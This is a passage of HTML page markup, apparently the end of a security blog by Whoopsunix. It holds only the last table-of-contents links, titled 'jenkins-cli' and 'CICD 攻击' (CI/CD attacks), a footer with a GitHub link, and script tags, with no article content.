class="table-of-contents__link toc-highlight">0x06 jenkins-cli</a></li><li><a href="#0x07-cicd-攻击" class="table-of-contents__link toc-highlight">0x07 CICD 攻击</a></li></ul></div></div></div></div></main></div></div></div><footer class="footer"><div class="container container-fluid"><div class="row footer__links"><div class="col footer__col"><div class="footer__title">More</div><ul class="footer__items clean-list"><li class="footer__item"><a href="https://github.com/Whoopsunix" target="_blank" rel="noopener noreferrer" class="footer__link-item">GitHub<svg width="13.5" height="13.5" aria-hidden="true" viewBox="0 0 24 24" class="iconExternalLink_nPIU"><path fill="currentColor" d="M21 13v10h-21v-19h12v2h-10v15h17v-8h2zm3-12h-10.988l4.035 4-6.977 7.07 2.828 2.828 6.977-7.07 4.125 4.172v-11z"></path></svg></a></li></ul></div></div><div class="footer__bottom text--center"><div class="footer__copyright">Whoopsunix © 2024</div></div></div></footer></div>
<script src="/assets/js/runtime~main.9b49e382.js"></script>
<script src="/assets/js/main.c18b1eab.js"></script>
</body>
</html>